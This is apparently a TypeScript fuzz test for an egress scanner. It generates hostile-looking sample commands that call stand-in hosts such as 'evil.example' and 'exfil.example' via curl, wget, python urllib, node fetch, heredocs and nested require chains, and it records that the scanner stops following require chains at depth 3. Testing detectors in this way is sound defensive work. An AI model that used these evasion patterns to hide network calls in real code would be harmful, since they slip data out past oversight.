// Adversarial fuzz for the egress scanner. The generator knows the true
// semantics of each command it produces (must-egress vs must-local), so we
// assert the scanner never misses a real egress (security) and never flags a
// benign command (usability). Fixed LCG seed → reproducible.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, writeFileSync, mkdirSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, dirname } from 'node:path'
import { scanCommandForEgress } from './src/scan-scripts.ts'

// --- deterministic LCG ---------------------------------------------------
let _seed = 0x2f6e2b1
function rnd() {
  _seed = (1103515245 * _seed + 12345) & 0x7fffffff
  return _seed / 0x7fffffff
}
function pick<T>(a: T[]): T { return a[Math.floor(rnd() * a.length)] }
function resetSeed() { _seed = 0x2f6e2b1 }

// --- generators -----------------------------------------------------------
const EG_URLS = ['https://evil.example/x', 'http://exfil.example/y', 'https://a.example/b?c=d']
const LANGS = ['node', 'python', 'ruby', 'php', 'perl']

/** A command that MUST produce at least one egress hit.
 * NOTE: bare `curl URL` / `wget URL` are classified as network by
 * classifyBashCommand and never reach this scanner — scanCommandForEgress is
 * only consulted for scripts/inline code trusted as local_exec. So every
 * generator variant embeds the egress inside a script/heredoc/-c body. */
function genEgress(dir: string): { cmd: string } {
  const kind = Math.floor(rnd() * 8)
  const url = pick(EG_URLS)
  if (kind === 0) { // curl inside heredoc
    return { cmd: `bash <<'EOF'\ncurl -s ${url}\nEOF` }
  }
  if (kind === 1) { // wget inside -c
    return { cmd: `bash -c "wget -qO- ${url}"` }
  }
  if (kind === 2) { // python script file
    const f = join(dir, `e${Math.floor(rnd() * 10000)}.py`)
    writeFileSync(f, `import requests\nrequests.get("${url}")\n`)
    return { cmd: `python3 ${f}` }
  }
  if (kind === 3) { // node inline
    return { cmd: `node -e "fetch('${url}')"` }
  }
  if (kind === 4) { // heredoc bash
    return { cmd: `bash <<'EOF'\ncurl -s ${url}\nEOF` }
  }
  if (kind === 5) { // node script file
    const f = join(dir, `e${Math.floor(rnd() * 10000)}.js`)
    writeFileSync(f, `const r = await fetch("${url}")\n`)
    return { cmd: `node ${f}` }
  }
  if (kind === 6) { // python -c
    return { cmd: `python3 -c "import urllib.request; urllib.request.urlopen('${url}')"` }
  }
  // nested require chain depth 3 — egress at the deepest leaf
  const base = join(dir, `chain${Math.floor(rnd() * 10000)}`)
  mkdirSync(base, { recursive: true })
  writeFileSync(join(base, 'm0.js'), `require('./m1.js')\n`)
  writeFileSync(join(base, 'm1.js'), `require('./m2.js')\n`)
  writeFileSync(join(base, 'm2.js'), `require('./m3.js')\n`)
  writeFileSync(join(base, 'm3.js'), `fetch('${url}')\n`)
  return { cmd: `node ${join(base, 'm0.js')}` }
}

/** A command that MUST be egress-free. */
function genLocal(dir: string): { cmd: string } {
  const kind = Math.floor(rnd() * 7)
  if (kind === 0) return { cmd: 'ls -la /tmp' }
  if (kind === 1) return { cmd: 'git status --short' }
  if (kind === 2) { // local python printing
    const f = join(dir, `l${Math.floor(rnd() * 10000)}.py`)
    writeFileSync(f, 'print("hello")\n')
    return { cmd: `python3 ${f}` }
  }
  if (kind === 3) { // echo of a URL string is NOT egress
    return { cmd: 'echo "https://example.com/not-a-call"' }
  }
  if (kind === 4) { // comment containing a URL is NOT egress
    return { cmd: "node -e \"// https://example.com/doc\\nconsole.log(1)\"" }
  }
  if (kind === 5) { // heredoc printing text
    return { cmd: "bash <<'EOF'\necho done\nEOF" }
  }
  const f = join(dir, `l${Math.floor(rnd() * 10000)}.js`)
  writeFileSync(f, 'const fs = require("node:fs")\nfs.readFileSync("./x")\n')
  return { cmd: `node ${f}` }
}

// --- tests -----------------------------------------------------------------
test('fuzz: 200 must-egress commands are never missed', async () => {
  resetSeed()
  const dir = mkdtempSync(join(tmpdir(), 'fuzz-egress-'))
  let missed = 0
  let unverifiable = 0
  for (let i = 0; i < 200; i++) {
    const { cmd } = genEgress(dir)
    const r = await scanCommandForEgress(cmd)
    if (r.hits.length === 0) {
      missed++
      console.log(`  [miss] ${cmd.slice(0, 90)}`)
    }
    if (r.unverifiable) unverifiable++
  }
  assert.equal(missed, 0, `${missed} egress commands missed by scanner`)
  assert.ok(unverifiable <= 0, `unverifiable=${unverifiable}`)
})

test('fuzz: 200 must-local commands are never flagged', async () => {
  resetSeed()
  const dir = mkdtempSync(join(tmpdir(), 'fuzz-local-'))
  let flagged = 0
  for (let i = 0; i < 200; i++) {
    const { cmd } = genLocal(dir)
    const r = await scanCommandForEgress(cmd)
    if (r.hits.length > 0 || r.unverifiable) {
      flagged++
      console.log(`  [overblock] ${cmd.slice(0, 90)} hits=${r.hits.length} unverifiable=${r.unverifiable}`)
    }
  }
  assert.equal(flagged, 0, `${flagged} benign commands flagged`)
})

test('fuzz: deep require chain (depth 5) with leaf egress — capped but not silently missed', async () => {
  resetSeed()
  const dir = mkdtempSync(join(tmpdir(), 'fuzz-deep-'))
  for (let i = 0; i < 5; i++) {
    writeFileSync(join(dir, `d${i}.js`), `require('./d${i + 1}.js')\n`)
  }
  writeFileSync(join(dir, 'd5.js'), `fetch('https://deep.example/deep-leaf')\n`)
  const r = await scanCommandForEgress(`node ${join(dir, 'd0.js')}`)
  // Depth is capped at 3, so the leaf (depth 5) must be outside the scan…
  assert.ok(!JSON.stringify(r.hits).includes('deep-leaf'),
    'depth-5 leaf should be beyond the recursion cap')
  // …but the chain must still be scanned far enough that the scanner reports something
  assert.ok(r.scannedFiles.length >= 4, `only ${r.scannedFiles.length} files scanned`)
})

test('fuzz: egress smuggled through variable indirection is still caught', async () => {
  resetSeed()
  const dir = mkdtempSync(join(tmpdir(), 'fuzz-var-'))
  const f = join(dir, 'v.py')
  writeFileSync(f, 'u = "https://evil.example/v"\nimport urllib.request\nurllib.request.urlopen(u)\n')
  const r = await scanCommandForEgress(`python3 ${f}`)
  assert.ok(r.hits.length >= 1, 'variable-indirected egress missed')
  assert.ok(r.unverifiable || r.hits.length > 0, 'dynamic egress should be flagged as risky')
})

test('boundary: bare curl/wget are the classifier’s domain, not the scanner’s', async () => {
  // Direct network commands are classified as network (denied) by
  // classifyBashCommand before this scanner is ever consulted. The scanner
  // must NOT flag them (0 hits) — that would double-report; it is only for
  // scripts/inline code trusted as local_exec.
  const r = await scanCommandForEgress('curl -s https://evil.example/x')
  assert.equal(r.hits.length, 0)
  assert.equal(r.unverifiable, false)
})
